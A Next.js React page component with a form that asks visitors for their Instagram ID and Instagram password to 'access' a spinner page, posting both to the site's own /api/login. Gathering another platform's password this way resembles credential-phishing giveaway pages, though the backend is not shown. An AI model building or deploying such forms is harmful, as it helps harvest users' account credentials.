import { useState } from 'react';
import Router from 'next/router';

export default function Home() {
  const [instaId, setInstaId] = useState('');
  const [instaPassword, setInstaPassword] = useState('');

  const handleLogin = async (e) => {
    e.preventDefault();
    // Send the Instagram ID and password to the backend for verification
    const res = await fetch('/api/login', {
      method: 'POST',
      body: JSON.stringify({ instaId, instaPassword }),
      headers: { 'Content-Type': 'application/json' }
    });

    const data = await res.json();
    if (data.success) {
      // If login successful, redirect to spinner page
      Router.push('/spinner');
    } else {
      alert('Login Failed');
    }
  };

  return (
    <div>
      <h1>Login to Access Spinner</h1>
      <form onSubmit={handleLogin}>
        <input 
          type="text" 
          placeholder="Instagram ID" 
          value={instaId} 
          onChange={(e) => setInstaId(e.target.value)} 
        />
        <input 
          type="password" 
          placeholder="Instagram Password" 
          value={instaPassword} 
          onChange={(e) => setInstaPassword(e.target.value)} 
        />
        <button type="submit">Submit</button>
      </form>
    </div>
  );
}
